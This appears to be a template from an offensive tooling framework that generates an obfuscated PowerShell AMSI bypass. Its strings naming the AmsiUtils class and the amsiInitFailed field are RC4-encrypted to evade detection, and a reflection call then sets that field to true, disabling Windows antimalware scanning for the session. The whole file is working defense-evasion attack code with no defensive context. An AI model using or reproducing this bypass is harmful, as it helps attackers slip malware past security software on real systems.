{% set strings = [
    'System.Management.Automation.AmsiUtils',
    'amsiInitFailed',
    'NonPublic,Static',
]%}

{% for s in strings %}
    $refstring{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
{% endfor %}


[Ref].Assembly.GetType($refstring1).GetField($refstring2,$refstring3).SetValue($null,$true)
